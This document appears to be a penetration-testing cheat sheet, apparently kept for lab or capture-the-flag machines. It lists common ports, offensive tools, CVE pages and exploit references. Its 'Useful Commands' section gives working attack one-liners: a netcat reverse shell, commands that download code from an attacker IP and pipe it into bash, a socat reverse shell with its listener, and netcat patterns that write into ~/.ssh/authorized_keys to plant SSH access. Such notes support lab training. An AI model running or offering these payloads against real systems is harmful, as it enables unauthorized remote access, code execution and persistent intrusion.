# CheatSheet

## Ports
| Service | Port      |
|:-------:|:---------:|
| FTP     | 20 / 21   |
| SSH     | 22        |
| Telnet  | 23        |
| SMTP    | 25        |
| DNS     | 53        |
| HTTP    | 80        |
| POP3    | 110       |
| HTTPS   | 443       |
| SMB     | 139 / 445 |
| NFS     | 2049      |
| MySQL   | 3306      |

## Tools
- [Rustscan](tool/rustscan.md)
- [Nmap](tool/nmap.md)
- [MSFVenom](tool/msfvenom.md)
- [Gobuster](tool/gobuster.md)
- [Hydra](tool/hydra.md)
- [John the Ripper](tool/john.md)
- [Hashcat](tool/hashcat.md)
- [Netcat](tool/netcat.md)

## Workflow by service
- [SSH](service/ssh.md)
- [SMB](service/smb.md)
- [Telnet](service/telnet.md)
- [NFS](service/nfs.md)
- [FTP](service/ftp.md)
- [SMTP](service/smtp.md)
- [MySQL](service/mysql.md)

## Useful Commands
### Shell payload
```
echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.4.49.251 4444 >/tmp/f" > shell.sh
```

### Download file
```
FILE=[FILE NAME]; wget http://10.4.49.251/$FILE -O /tmp/$FILE; chmod +x /tmp/$FILE; sh /tmp/$FILE
```
```
curl 10.10.14.7/[FILE] | bash
```

### LinEnum

```
wget http://10.4.49.251/LinEnum.sh -O /tmp/LinEnum.sh; chmod +x /tmp/LinEnum.sh; /tmp/LinEnum.sh
```
```
curl 10.10.14.7/LinEnum.sh | bash
```

### Socat
#### Target
```
wget http://10.4.49.251/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.4.49.251:4445
```

#### Attacker (Kali)
```
socat file:`tty`,raw,echo=0 TCP-L:4445
```

#### To upgrade more
```
export SHELL=bash; export TERM=xterm-256color; stty rows 60 columns 126
```

### Tramp (Emacs)

#### Basic
```
ls $HOME && { { ls $HOME/.ssh || mkdir $HOME/.ssh; } && nc -lp 7777 >> $HOME/.ssh/authorized_keys; }
```

#### Socat Pattern
```
ls $HOME && { { ls $HOME/.ssh || mkdir $HOME/.ssh; } && nc -lp 7777 >> $HOME/.ssh/authorized_keys; } || { nc -lp 7777 > /tmp/socat && chmod +x /tmp/socat && /tmp/socat file:`tty`,raw,echo=0 TCP-L:7777; }
```

#### Shell Upgrade Pattern
```
ls $HOME && { { ls $HOME/.ssh || mkdir $HOME/.ssh; } && nc -lp 7777 >> $HOME/.ssh/authorized_keys; } || { nc -lp 7777 > /tmp/upgrade-shell.sh && chmod +x /tmp/upgrade-shell.sh && . /tmp/upgrade-shell.sh; }
```

## CVEs
- CVE : 2014-6287 ([39161](cve/cve-2014-6287-39161.md))
- CVE : 2014-6287 ([49125](cve/cve-2014-6287-49125.md))


## Reference

Exploit DB  
https://www.exploit-db.com/

MSF Console Commands  
https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/

Meterpreter Commands  
https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/

GTFOBins  
https://gtfobins.github.io/

PayloadsAllTheThings / Reverse Shell Cheat Sheet
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

PayloadsAllTheThings / Linux - Privilege Escalation
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#find-suid-binaries

CrackStation  
https://crackstation.net/

Hash Analyzer  
https://www.tunnelsup.com/hash-analyzer/

CyberChef  
https://gchq.github.io/CyberChef/

Upgrading Simple Shells to Fully Interactive TTYs  
https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
